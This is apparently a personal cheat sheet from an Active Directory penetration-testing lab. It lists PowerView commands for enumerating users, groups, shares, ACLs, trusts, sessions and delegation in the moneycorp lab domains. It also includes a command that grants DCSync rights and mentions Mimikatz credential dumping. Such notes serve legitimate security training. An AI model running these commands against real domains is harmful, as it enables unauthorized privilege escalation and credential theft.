__Users__
```powershell
Get-DomainUser | select -ExpandProperty samaccountname
```

__Computers__
```powershell
Get-DomainComputer | select -ExpandProperty dnshostname
```

__Domain Admins__
```powershell
Get-DomainGroupMember -Identity "Domain Admins" | select membername
```

__Enterprise Admins Group__
```powershell
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local | select membername
```

__Groups__
- See any interesting groups?
```powershell
Get-DomainGroup
```

__user groups__
```powershell
Get-DomainGroup -UserName "student30" | select samaccountname
```
---
__Check shares__
- use `-CheckAccess` - only shares the current user has read access to are returned.

```powershell
(Get-DomainComputer).samaccountname -replace '\$' | % { Invoke-ShareFinder -ComputerName $_ -CheckShareAccess}
```

```powershell
 Find-DomainShare -ComputerDomain dollarcorp.moneycorp.local -threads 5
```

```powershell
net view \\eurocorp-dc.eurocorp.local
```

---
__OUs__
```powershell
Get-DomainOU | select -ExpandProperty name
```

__Machines in a OU__
```powershell
(Get-DomainOU -Identity "StudentMachines").distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```

__GPO__
```powershell
Get-DomainGPO
```

__GPOs applied on OUs__
```powershell
Get-DomainGPO -Identity (Get-DomainOU -Identity StudentMachines).gplink.substring(11,(Get-DomainOU -Identity StudentMachines).gplink.length-72)
```

---
__ACLs of Domain Admins__
```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```

__Interesting ACL of a user__
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student30"}
```

__Interesting ACL of a groups of user__
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```
```powershell
Get-DomainObjectAcl "control30user" -ResolveGUIDs  | ? {$_.securityidentifier -eq $sid}
```
__Add DC Sync Rights__
```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student30 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

---
__Domains in current forest__
```powershell
Get-ForestDomain
```

__Trusts of current domain__
```powershell
Get-DomainTrust
```

__External Trusts of current domain__
```powershell
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

__External forest Trusts__
```powershell
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
```
---

__Find domain admin session__ (Run on all compromised machines)
```powershell
Find-DomainUserLocation -verbose
```

__Find user session__
```powershell
Invoke-UserHunter
```

__Find local admin access__
```powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

```powershell
Find-PSRemotingLocalAdminAccess -verbose
```
---
__Applocker__
```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
---
__Unconstrained Delegation__
```powershell
Get-DomainComputer -Unconstrained | select -ExpandProperty
```

__Constrained Delegation__
```powershell
Get-DomainComputer -TrustedToAuth
```

---
__Vulnerable certificates__
```powershell
Certify.exe find /vulnerable
```

---
### Compromised a machine/user?
- Check for interesting ACLs of users, groups
- Groups recursively (Descriptions)
- BloodHound
- Derivative Local admin access
- Mimikatz (sekurlsa::logonpasswords, lsadump)
- SQL server access
- 

